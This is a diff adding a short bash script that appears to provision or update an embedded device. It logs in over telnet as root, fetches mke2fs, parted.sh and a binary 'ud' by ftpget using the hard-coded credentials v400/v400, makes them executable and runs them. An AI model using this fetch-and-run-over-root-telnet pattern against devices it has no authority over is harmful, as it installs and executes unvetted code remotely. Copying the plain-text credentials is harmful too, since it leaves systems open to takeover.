@@ -1,0 +1,29 @@
+#!/bin/bash
+# 1. target IP 2. source IP 3. port number.
+
+echo 
+(
+	sleep 2
+	echo "root"
+	sleep 2
+	echo "cd /tmp"
+	sleep 1
+	echo "ftpget -u v400 -p v400 $2 mke2fs mke2fs"
+	sleep 3
+	echo "chmod +x mke2fs"
+	sleep 1
+        echo "ftpget -u v400 -p v400 $2 parted.sh parted.sh"
+        sleep 3
+        echo "chmod +x parted.sh"
+        sleep 1
+	echo "ftpget -u v400 -p v400 $2 ud ud"
+	sleep 3
+	echo "chmod +x ud"
+	sleep 3
+	echo "mdev -s"
+	sleep 5
+	echo "./ud $3 &"
+	sleep 1
+	echo "exit"
+)|telnet $1 
+
